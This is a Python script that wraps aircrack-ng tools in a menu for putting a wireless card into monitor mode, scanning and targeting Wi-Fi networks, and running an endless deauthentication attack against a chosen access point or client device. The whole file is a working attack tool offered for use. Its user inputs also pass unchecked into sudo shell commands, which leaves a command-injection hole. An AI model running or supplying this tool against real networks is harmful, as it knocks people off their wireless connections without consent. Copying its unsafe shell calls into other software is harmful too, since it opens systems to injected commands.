import os

def start_monitor_mode(interface):
    os.system(f"sudo airmon-ng start {interface}")

def scan_networks():
    os.system("sudo airodump-ng wlan0mon")

def target_network(bssid, channel):
    os.system(f"sudo airodump-ng --bssid {bssid} --channel {channel} wlan0mon")

def deauth_attack(bssid, target_mac=None):
    try:
        while True:
            if target_mac:
                os.system(f"sudo aireplay-ng --deauth 10 -a {bssid} -c {target_mac} wlan0mon")
            else:
                os.system(f"sudo aireplay-ng --deauth 10 -a {bssid} wlan0mon")
    except KeyboardInterrupt:
        print("\nDeauthentication attack stopped by user.")

def stop_monitor_mode():
    os.system("sudo airmon-ng stop wlan0mon")

def menu():
    while True:
        print("1. Start Monitor Mode")
        print("2. Scan for Networks")
        print("3. Target a Network")
        print("4. Perform Deauthentication Attack")
        print("5. Stop Monitor Mode")
        print("6. Exit")
        choice = input("Enter your choice: ")
        
        if choice == "1":
            start_monitor_mode("wlan0")
        elif choice == "2":
            scan_networks()
        elif choice == "3":
            bssid = input("Enter the BSSID of the target network: ")
            channel = input("Enter the Channel of the target network: ")
            target_network(bssid, channel)
        elif choice == "4":
            bssid = input("Enter the BSSID of the target network: ")
            target_mac = input("Enter the MAC address of the target device (or leave blank for all): ")
            deauth_attack(bssid, target_mac)
        elif choice == "5":
            stop_monitor_mode()
        elif choice == "6":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    menu()
